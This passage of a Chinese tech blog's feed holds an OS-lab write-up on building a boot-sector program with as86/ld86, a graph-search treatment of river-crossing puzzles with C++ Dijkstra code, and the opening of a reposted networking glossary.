class="line">msg1:</span><br><span class="line">! 换行 + 回车</span><br><span class="line">    .byte   13,10</span><br><span class="line">    .ascii  &quot;Hello OS world, my name is LZJ&quot;</span><br><span class="line">! 两对换行 + 回车</span><br><span class="line">    .byte   13,10,13,10</span><br><span class="line"></span><br><span class="line">! boot_flag 必须在最后两个字节</span><br><span class="line">.org 510</span><br><span class="line">! 设置引导扇区标记 0xAA55</span><br><span class="line">! 必须有它，才能引导</span><br><span class="line">boot_flag:</span><br><span class="line">    .word   0xAA55</span><br></pre></td></tr></table></figure><p>将 <code>.org 508</code> 修改为 <code>.org 510</code>，是因为这里不需要 <code>root_dev: .word ROOT_DEV</code>，为了保证 <code>boot_flag</code> 一定在最后两个字节，所以要修改 <code>.org</code>。</p><p>完整的代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">entry _start</span><br><span class="line">_start:</span><br><span class="line">    mov ah,#0x03</span><br><span class="line">    xor bh,bh</span><br><span class="line">    int 0x10</span><br><span class="line">    mov cx,#36</span><br><span class="line">    mov bx,#0x0007</span><br><span class="line">    mov bp,#msg1</span><br><span class="line">    mov ax,#0x07c0</span><br><span class="line">    mov es,ax</span><br><span class="line">    mov ax,#0x1301</span><br><span class="line">    int 0x10</span><br><span class="line">inf_loop:</span><br><span class="line">    jmp inf_loop</span><br><span class="line">msg1:</span><br><span class="line">    .byte   13,10</span><br><span class="line">    .ascii  &quot;Hello OS world, my name is LZJ&quot;</span><br><span class="line">    .byte   13,10,13,10</span><br><span class="line">.org 510</span><br><span class="line">boot_flag:</span><br><span class="line">    .word   0xAA55</span><br></pre></td></tr></table></figure><p>接着执行下面两个命令来编译和链接 bootsect.s。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> as86 -0 -a -o bootsect.o bootsect.s</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ld86 -0 -s -o bootsect bootsect.o</span></span><br></pre></td></tr></table></figure><p>其中 <code>-0</code>（注意：这是数字 0，不是字母 O）表示生成 8086 的 16 位目标程序，<code>-a</code> 表示生成与 GNU as 和 ld 部分兼容的代码，<code>-s</code> 告诉链接器 ld86 去除最后生成的可执行文件中的符号信息。</p><p>如果这两个命令没有任何输出，说明编译与链接都通过了。</p><p>Ubuntu 下用 <code>ls -l</code> 可列出下面的信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-rw--x--x    1  root  root  544  Jul  25  15:07   bootsect</span><br><span class="line">-rw------    1  root  root  257  Jul  25  15:07   bootsect.o</span><br><span class="line">-rw------    1  root  root  686  Jul  25  14:28   bootsect.s</span><br></pre></td></tr></table></figure><p>需要留意的文件是 bootsect ，它的大小是 544 字节，而引导程序必须要正好占用一个磁盘扇区，即 512 个字节。造成多了 32 个字节的原因是 ld86 产生的是 Minix 可执行文件格式，这样的可执行文件处理文本段、数据段等部分以外，还包括一个 Minix 可执行文件头部，它的结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exec</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> a_magic[<span class="number">2</span>];  <span class="comment">//执行文件魔数</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> a_flags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> a_cpu;       <span class="comment">//CPU标识号</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> a_hdrlen;    <span class="comment">//头部长度，32字节或48字节</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> a_unused;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> a_version;</span><br><span class="line">    <span class="keyword">long</span> a_text; <span class="keyword">long</span> a_data; <span class="keyword">long</span> a_bss; <span class="comment">//代码段长度、数据段长度、堆长度</span></span><br><span class="line">    <span class="keyword">long</span> a_entry;    <span class="comment">//执行入口地址</span></span><br><span class="line">    <span class="keyword">long</span> a_total;    <span class="comment">//分配的内存总量</span></span><br><span class="line">    <span class="keyword">long</span> a_syms;     <span class="comment">//符号表大小</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>算一算：6 char（6 字节）+ 1 short（2 字节） + 6 long（24 字节）= 32，正好是 32 个字节，去掉这 32 个字节后就可以放入引导扇区了（这是 <code>tools/build.c</code> 的用途之一）。</p><p>对于上面的 Minix 可执行文件，其 a_magic[0]=0x01，a_magic[1]=0x03，a_flags=0x10（可执行文件），a_cpu=0x04（表示 Intel i8086/8088，如果是 0x17 则表示 Sun 公司的 SPARC），所以 bootsect 文件的头几个字节应该是 01 03 10 04。为了验证一下，Ubuntu 下用命令“hexdump -C bootsect”可以看到：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">00000000  01 03 10 04 20 00 00 00  00 02 00 00 00 00 00 00  |.... ...........|</span><br><span class="line">00000010  00 00 00 00 00 00 00 00  00 82 00 00 00 00 00 00  |................|</span><br><span class="line">00000020  b8 c0 07 8e d8 8e c0 b4  03 30 ff cd 10 b9 17 00  |.........0......|</span><br><span class="line">00000030  bb 07 00 bd 3f 00 b8 01  13 cd 10 b8 00 90 8e c0  |....?...........|</span><br><span class="line">00000040  ba 00 00 b9 02 00 bb 00  02 b8 04 02 cd 13 73 0a  |..............s.|</span><br><span class="line">00000050  ba 00 00 b8 00 00 cd 13  eb e1 ea 00 00 20 90 0d  |............. ..|</span><br><span class="line">00000060  0a 53 75 6e 69 78 20 69  73 20 72 75 6e 6e 69 6e  |.Sunix is runnin|</span><br><span class="line">00000070  67 21 0d 0a 0d 0a 00 00  00 00 00 00 00 00 00 00  |g!..............|</span><br><span class="line">00000080  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00000210  00 00 00 00 00 00 00 00  00 00 00 00 00 00 55 aa  |..............U.|</span><br><span class="line">00000220</span><br></pre></td></tr></table></figure><p>接下来干什么呢？是的，要去掉这 32 个字节的文件头部（<code>tools/build.c</code> 的功能之一就是这个）！随手编个小的文件读写程序都可以去掉它。不过，懒且聪明的人会在 Ubuntu 下用命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dd bs=1 <span class="keyword">if</span>=bootsect of=Image skip=32</span><br></pre></td></tr></table></figure><p>生成的 Image 就是去掉文件头的 bootsect。</p><p>去掉这 32 个字节后，将生成的文件拷贝到 linux-0.11 目录下，并一定要命名为“Image”（注意大小写）。然后就“run”吧！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当前的工作路径为 .../oslab/linux-0.11/boot/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将刚刚生成的 Image 复制到 linux-0.11 目录下</span></span><br><span class="line">$ cp ./Image ../Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行 oslab 目录中的 run 脚本</span></span><br><span class="line">$ ../../run</span><br></pre></td></tr></table></figure><p><img src="https://doc.shiyanlou.com/userid13labid374time1421133611337" alt="bootsect 引导后的系统启动情况"></p><blockquote><p>run时出错：No bootable device</p><p><img src="C:/Users/fdxr1/AppData/Roaming/Typora/typora-user-images/image-20210419083654490.png"></p></blockquote><h1 id="实验二、"><a href="#实验二、" class="headerlink" title="实验二、"></a>实验二、</h1><p>未完待续。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;哈工大操作系统课程实验记录。&lt;/p&gt;</summary>
    
    
    
    <category term="操作系统" scheme="https://www.fvolcano.red/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="实验" scheme="https://www.fvolcano.red/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>图论-过河问题及其变形</title>
    <link href="https://www.fvolcano.red/2020/Graph-CrossRiver/"/>
    <id>https://www.fvolcano.red/2020/Graph-CrossRiver/</id>
    <published>2020-11-09T13:13:01.000Z</published>
    <updated>2020-11-09T13:13:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>一个农夫带着一头狼、一头羊、一颗白菜过河。他面前只有一条船，只能容纳他和一件物品，只有农夫会划船。如果农夫不在场，狼会吃羊、羊会吃白菜，农夫在场则不会。求将所有物品运到对岸的方案。<a id="more"></a></p><h1 id="图论-安全过河的最短路径问题"><a href="#图论-安全过河的最短路径问题" class="headerlink" title="图论-安全过河的最短路径问题"></a>图论-安全过河的最短路径问题</h1><p><a href="https://www.cnblogs.com/lfri/p/9866992.html">原博客</a></p><h2 id="农夫过河问题"><a href="#农夫过河问题" class="headerlink" title="农夫过河问题"></a>农夫过河问题</h2><p><strong>问题描述</strong></p><p>一个农夫带着一头狼、一头羊、一颗白菜过河。他面前只有一条船，只能容纳他和一件物品，只有农夫会划船。如果农夫不在场，狼会吃羊、羊会吃白菜，农夫在场则不会。求将所有物品运到对岸的方案。</p><p><strong>解题思路</strong></p><p>根据物品的位置定义状态，若在左岸记为1，右岸记为0，于是最终方案就是(1,1,1,1)–&gt;(0,0,0,0)所经过的路径。</p><p>1、定义状态</p><p><a href="https://img2018.cnblogs.com/blog/1365470/201810/1365470-20181028191311144-1211710443.png"><img src="/2020/Graph-CrossRiver/1365470-20181028191311144-1211710443.png"></a></p><p>2、列举所有状态（人、狼、羊、菜）</p><p><a href="https://img2018.cnblogs.com/blog/1365470/201810/1365470-20181028191459048-317298943.png"><img src="/2020/Graph-CrossRiver/1365470-20181028191459048-317298943.png"></a></p><p>3、删除不合理的状态（狼和羊、羊和菜）</p><p><a href="https://img2018.cnblogs.com/blog/1365470/201810/1365470-20181028191647740-1828632698.png"><img src="/2020/Graph-CrossRiver/1365470-20181028191647740-1828632698.png"></a></p><p>4、连边（模拟一次渡河）</p><p><a href="https://img2018.cnblogs.com/blog/1365470/201810/1365470-20181028192013516-1740822628.png"><img src="/2020/Graph-CrossRiver/1365470-20181028192013516-1740822628-1619247456141.png"></a></p><p>5、寻找路径</p><p>寻找(1111)–&gt;(0000)的边，可以用寻路算法如bfs、dfs,如果要求最短路可以用最短路算法如bfs、Dijsktra等，当然这里图很简单，可直接观察出来。</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="params">(<span class="number">1111</span>)</span>--&gt;</span><span class="function"><span class="params">(<span class="number">0101</span>)</span>--&gt;</span><span class="function"><span class="params">(<span class="number">1101</span>)</span>--&gt;</span><span class="function"><span class="params">(<span class="number">0001</span>)</span>--&gt;</span><span class="function"><span class="params">(<span class="number">1011</span>)</span>--&gt;</span><span class="function"><span class="params">(<span class="number">0010</span>)</span>--&gt;</span><span class="function"><span class="params">(<span class="number">1010</span>)</span>--&gt;</span>(<span class="number">0000</span>)（两条最短路之一）</span><br><span class="line">       左岸                                 右岸</span><br><span class="line"><span class="number">1</span>、人  狼  羊 花                           空</span><br><span class="line"><span class="number">2</span>、狼  花                                 人 羊</span><br><span class="line"><span class="number">3</span>、人  狼 花                               羊</span><br><span class="line"><span class="number">4</span>、花                                     人 狼  羊</span><br><span class="line"><span class="number">5</span>、人  羊  花                              狼</span><br><span class="line"><span class="number">6</span>、羊                                     人 花  狼</span><br><span class="line"><span class="number">7</span>、人 羊                                  狼 花</span><br><span class="line"><span class="number">8</span>、空                                     狼 花 人 羊   </span><br></pre></td></tr></table></figure><h2 id="传教士与吃人恶魔的问题"><a href="#传教士与吃人恶魔的问题" class="headerlink" title="传教士与吃人恶魔的问题"></a>传教士与吃人恶魔的问题</h2><p><strong>问题描述</strong></p><p>有三个传教士和三个吃人恶魔要渡过一条河，河中有一条船，只能装下两个人。在任何地方（无论是岸边还是船上），如果吃人恶魔数量多于传教士数量，吃人恶魔就会吃掉传教士。问：怎么才能让这些都安全过河？</p><p><strong>解题思路</strong></p><p>1、定义状态</p><p><a href="https://img2018.cnblogs.com/blog/1365470/201810/1365470-20181028194640506-192088956.png"><img src="/2020/Graph-CrossRiver/1365470-20181028194640506-192088956.png"></a></p><p>2、列举所有状态</p><p><a href="https://img2018.cnblogs.com/blog/1365470/201810/1365470-20181028194800042-757542463.png"><img src="/2020/Graph-CrossRiver/1365470-20181028194800042-757542463.png"></a></p><p>3、删除不合理状态</p><p><a href="https://img2018.cnblogs.com/blog/1365470/201810/1365470-20181028194856707-156878733.png"><img src="/2020/Graph-CrossRiver/1365470-20181028194856707-156878733.png"></a></p><p>4、连边（模拟依次渡河变化）</p><p><a href="https://img2018.cnblogs.com/blog/1365470/201810/1365470-20181028195050222-475204241.png"><img src="/2020/Graph-CrossRiver/1365470-20181028195050222-475204241.png"></a></p><p>5、寻找路径</p><p>寻找(33 L 00)–&gt;(00 R 33)的路径</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">其中一条路径</span><br><span class="line">(<span class="number">33</span> L <span class="number">00</span>)--&gt;(<span class="number">31</span> R <span class="number">01</span>)--&gt;(<span class="number">32</span> L <span class="number">01</span>)--&gt;(<span class="number">30</span> R <span class="number">03</span>)--&gt;(<span class="number">31</span> L <span class="number">02</span>)--&gt;(<span class="number">11</span> R <span class="number">22</span>)--&gt;(<span class="number">22</span> L <span class="number">01</span>)--&gt;(<span class="number">02</span> R <span class="number">31</span>)--&gt;(<span class="number">03</span> L <span class="number">30</span>)--&gt;(<span class="number">01</span> R <span class="number">32</span>)--&gt;(<span class="number">02</span> L <span class="number">31</span>)--&gt;(<span class="number">00</span> R <span class="number">33</span>)</span><br><span class="line"><span class="number">1</span>、两个吃人恶魔过河</span><br><span class="line"><span class="number">2</span>、一个吃人恶魔回来</span><br><span class="line"><span class="number">3</span>、两个吃人恶魔过河</span><br><span class="line"><span class="number">4</span>、一个吃人恶魔回来</span><br><span class="line"><span class="number">5</span>、两个传教士过河</span><br><span class="line"><span class="number">6</span>、一个传教士和一个吃人恶魔回来</span><br><span class="line"><span class="number">7</span>、两个传教士回来</span><br><span class="line"><span class="number">8</span>、一个吃人恶魔回去</span><br><span class="line"><span class="number">9</span>、两个吃人恶魔过河</span><br><span class="line"><span class="number">10</span>、一个吃人恶魔回去</span><br><span class="line"><span class="number">11</span>、两个吃人恶魔过河</span><br></pre></td></tr></table></figure><h2 id="四人过桥问题"><a href="#四人过桥问题" class="headerlink" title="四人过桥问题"></a>四人过桥问题</h2><p><strong>问题描述</strong></p><p>在一个漆黑的夜里，四位旅游者来到一座狭窄而没有护栏的桥边，如果不借助手电筒的话，大家是无论也不敢过去。不幸的是四个人中只有一只手电筒，而桥窄得只够两个人同时通过。如果各自单独过桥得话，四个人所需要的时间分别是1、2、5、10分钟，如果两个人同时过桥，所需要的时间是较慢的那个人单独行动时的时间。问：如何设计一个方案，让四个人尽快过桥。</p><p><strong>解题思路</strong></p><p>与前面两个相比，这次不仅要求方案，同时要求时间最短。 </p><p>同样需要定义状态，四个人+手电筒的位置</p><p>1、定义状态</p><p><a href="https://img2018.cnblogs.com/blog/1365470/201810/1365470-20181028230252029-80793767.png"><img src="/2020/Graph-CrossRiver/1365470-20181028230252029-80793767.png"></a></p><p>2、建图</p><p>分为每次通过一个人和每次两个人，都是带权无向边。</p><p>(下面只连接了与(01111)的边)</p><p><a href="https://img2018.cnblogs.com/blog/1365470/201810/1365470-20181028230534537-2018916150.png"><img src="/2020/Graph-CrossRiver/1365470-20181028230534537-2018916150.png"></a></p><p>3、寻找最短路</p><p>寻找(L 1111)–&gt;(R 0000)的最短路，即最短路算法中(01111)–&gt;(10000)的最短路，以下是利用Dijstra算法的解决方法。</p><p>最终答案为(2 + 1 + 10 + 2 + 2) = 17.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;string&gt;</span><br><span class="line">#include&lt;queue&gt;</span><br><span class="line">#include&lt;algorithm&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义图中结点</span></span><br><span class="line">struct Node</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> u, d;            <span class="comment">//该节点的编号与距离</span></span><br><span class="line">    bool operator &lt; (<span class="keyword">const</span> Node x) <span class="keyword">const</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>  d &gt; x.d;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//边结构体的定义</span></span><br><span class="line">struct Edge</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> V = <span class="number">32</span> + <span class="number">10</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> E = <span class="number">32</span> * <span class="number">32</span> + <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> dis[V];            <span class="comment">//源到各顶点的最短距离</span></span><br><span class="line"><span class="keyword">int</span> vis[V];            <span class="comment">//记录是否被收录，用来代替集合S</span></span><br><span class="line"><span class="keyword">int</span> head[V];          <span class="comment">//head[i]表示顶点i的第一条边的数组下标，&quot;-1&quot;表示顶点i没有边</span></span><br><span class="line">Edge edge[E];</span><br><span class="line"></span><br><span class="line"><span class="function">inline <span class="keyword">void</span> <span class="title">AddEdge</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> w, <span class="keyword">int</span> id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    edge[id].to = b;</span><br><span class="line">    edge[id].w = w;</span><br><span class="line">    edge[id].next = head[a];</span><br><span class="line">    head[a] = id;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//s为起点</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dijsktra</span><span class="params">(<span class="keyword">int</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    priority_queue&lt;Node&gt;q;            <span class="comment">//取出集合T中的最小值</span></span><br><span class="line">    memset(vis, <span class="number">0</span>, sizeof(vis));</span><br><span class="line">    memset(dis, INF, sizeof(dis));</span><br><span class="line"></span><br><span class="line">    dis[s] = <span class="number">0</span>;</span><br><span class="line">    q.push(Node&#123; s, dis[s] &#125;);</span><br><span class="line">    <span class="keyword">while</span> (!q.empty())</span><br><span class="line">    &#123;</span><br><span class="line">        Node x = q.top(); q.pop();</span><br><span class="line">        <span class="keyword">int</span> u = x.u;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (vis[u])    <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        vis[u] = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = head[u]; i != -<span class="number">1</span>; i = edge[i].next)    <span class="comment">//松弛与u直接相邻的顶点</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> v = edge[i].to;</span><br><span class="line">            <span class="keyword">int</span> w = edge[i].w;</span><br><span class="line">            <span class="keyword">if</span> (!vis[v] &amp;&amp; dis[u] + w &lt; dis[v])</span><br><span class="line">            &#123;</span><br><span class="line">                dis[v] = dis[u] + w;</span><br><span class="line">                q.push(Node&#123; v,dis[v] &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> score[] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">10</span> &#125;;   <span class="comment">//每个人单独行动的时间</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//建图</span></span><br><span class="line">    memset(head, -<span class="number">1</span>, sizeof(head));</span><br><span class="line">    <span class="keyword">int</span> id = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (<span class="number">1</span> &lt;&lt; <span class="number">4</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> bits[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)  bits[j] = (i &gt;&gt; j) &amp; <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//一次走一个人</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)  <span class="keyword">if</span> (bits[j])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> tmp = i - (<span class="number">1</span> &lt;&lt; j) + <span class="number">16</span>;</span><br><span class="line">            <span class="keyword">int</span> w = score[j];</span><br><span class="line">            AddEdge(i, tmp, w, id++);</span><br><span class="line">            AddEdge(tmp, i, w, id++);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//一次走两个人</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; <span class="number">3</span>;j++)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = j + <span class="number">1</span>; k &lt; <span class="number">4</span>; k++)   <span class="keyword">if</span> (bits[j] &amp;&amp; bits[k])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> tmp = i - (<span class="number">1</span> &lt;&lt; j) - (<span class="number">1</span> &lt;&lt; k) + <span class="number">16</span>;</span><br><span class="line">                <span class="keyword">int</span> w = max(score[j],score[k]);</span><br><span class="line">                AddEdge(i, tmp, w, id++);</span><br><span class="line">                AddEdge(tmp, i, w, id++);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Dijsktra(<span class="number">15</span>);</span><br><span class="line">    printf(<span class="string">&quot;%d\n&quot;</span>, dis[<span class="number">16</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;一个农夫带着一头狼、一头羊、一颗白菜过河。他面前只有一条船，只能容纳他和一件物品，只有农夫会划船。如果农夫不在场，狼会吃羊、羊会吃白菜，农夫在场则不会。求将所有物品运到对岸的方案。&lt;/p&gt;</summary>
    
    
    
    <category term="算法" scheme="https://www.fvolcano.red/categories/%E7%AE%97%E6%B3%95/"/>
    
    
  </entry>
  
  <entry>
    <title>计算机网络核心知识一网打尽</title>
    <link href="https://www.fvolcano.red/2020/null/"/>
    <id>https://www.fvolcano.red/2020/null/</id>
    <published>2020-11-06T00:02:49.000Z</published>
    <updated>2020-11-06T00:02:49.000Z</updated>
    
    <content type="html"><![CDATA[<p>转自公众号：<a href="https://mp.weixin.qq.com/s/6ju4j_ffLuOBuoO53ZhcOA">JavaGuide:大二逃课总结1.2w字的计算机网络知识</a> 。供之后复习用。<a id="more"></a></p><h2 id="1-计算机网络概述"><a href="#1-计算机网络概述" class="headerlink" title="1. 计算机网络概述"></a>1. 计算机网络概述</h2><h3 id="1-1-基本术语"><a href="#1-1-基本术语" class="headerlink" title="1.1. 基本术语"></a>1.1. 基本术语</h3><ol><li><strong>结点 （node）</strong> ：网络中的结点可以是计算机，集线器，交换机或路由器等。</li><li><strong>链路（link ）</strong> : 从一个结点到另一个结点的一段物理线路。中间没有任何其他交点。</li><li><strong>主机（host）</strong> ：连接在因特网上的计算机。</li><li><strong>ISP（Internet Service Provider）</strong> ：因特网服务提供者（提供商）。</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KyPrXgjoZp17VBfyxqcE8KTEyFqC9ZvMBlnT5nKpd29fmBvbyX0QFKA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="ISP (Internet Service Provider) Definition"></p><ol><li><strong>IXP（Internet eXchange Point）</strong> ：互联网交换点 IXP 的主要作用就是允许两个网络直接相连并交换分组，而不需要再通过第三个网络来转发分组。</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40Ko5p7DwqbmNKFGp6Tfib6HmshXw22mKoXMagJuKcRl7fqnVWRf6q5lGA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="IXP Traffic Levels During the Stratos Skydive — RIPE Labs"></p><p><a href="https://labs.ripe.net/Members/fergalc/ixp-traffic-during-stratos-skydive">https://labs.ripe.net/Members/fergalc/ixp-traffic-during-stratos-skydive</a></p><ol><li><strong>RFC(Request For Comments)</strong> ：意思是“请求评议”，包含了关于 Internet 几乎所有的重要的文字资料。</li><li><strong>广域网 WAN（Wide Area Network）</strong> ：任务是通过长距离运送主机发送的数据。</li><li><strong>城域网 MAN（Metropolitan Area Network）</strong>：用来将多个局域网进行互连。</li><li><strong>局域网 LAN（Local Area Network）</strong> 